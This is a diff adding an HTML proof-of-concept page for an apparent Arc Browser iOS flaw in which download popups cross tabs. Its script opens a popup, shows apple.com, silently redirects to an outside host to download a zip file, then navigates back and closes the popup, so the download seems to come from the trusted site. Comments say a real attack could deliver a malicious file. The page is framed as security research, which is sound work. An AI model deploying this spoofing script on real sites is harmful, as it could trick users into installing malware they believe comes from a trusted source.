@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Research - Arc Browser iOS</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            margin: 0;
+            padding: 20px;
+            background-color: #f9f9f9;
+            color: #333;
+        }
+        .container {
+            max-width: 600px;
+            margin: 40px auto;
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        h1 {
+            color: #0066cc;
+            margin-top: 0;
+        }
+        .btn {
+            background-color: #0066cc;
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            font-size: 16px;
+            border-radius: 6px;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: background-color 0.3s;
+        }
+        .btn:hover {
+            background-color: #0052a3;
+        }
+        .info {
+            margin-top: 20px;
+            padding: 15px;
+            background-color: #f0f7ff;
+            border-left: 4px solid #0066cc;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Arc Browser iOS Security Research</h1>
+        <p>This is a proof of concept demonstrating a potential vulnerability in Arc Browser on iOS where download popups can cross over tabs, potentially misleading users about the source of downloads.</p>
+        
+        <button id="demoButton" class="btn">Run Demonstration</button>
+        
+        <div class="info">
+            <strong>Note:</strong> This is for security research purposes only. The demonstration doesn't download any actual malicious files.
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('demoButton').addEventListener('click', function() {
+            // Create a controlled popup window with encoded content
+            const popupContent = btoa('<html><head><title>Trusted Site</title><style>body{font-family:sans-serif;margin:0;padding:20px;text-align:center;background:#f8f8f8;}h1{color:#0066cc;}</style></head>' +
+                '<body><h1>Trusted Website</h1><p>This appears to be apple.com but will trigger a download...</p></body></html>');
+            
+            const popup = window.open('data:text/html;base64,' + popupContent, '_blank', 'width=500,height=400');
+            
+            // First redirect to make user believe they're on a trusted site
+            setTimeout(function() {
+                if (popup) {
+                    // Update the popup's location to appear like a trusted domain
+                    // The URL is displayed but we maintain control of the window
+                    popup.location = 'https://www.apple.com';
+                }
+            }, 800);
+            
+            // After the user sees the trusted site, trigger the download
+            setTimeout(function() {
+                if (popup) {
+                    // Trigger download by redirecting to a URL that would initiate a download
+                    // In a real attack, this could be a malicious file
+                    popup.location = 'https://egghunter.in/chrome.zip';
+                    
+                    // Navigate back to maintain the illusion of being on the trusted site
+                    setTimeout(function() {
+                        if (popup) {
+                            popup.history.back();
+                            
+                            // Close the popup after a delay
+                            setTimeout(function() {
+                                if (popup && !popup.closed) {
+                                    popup.close();
+                                }
+                            }, 3000);
+                        }
+                    }, 1500);
+                }
+            }, 2000);
+        });
+    </script>
+</body>
+</html>
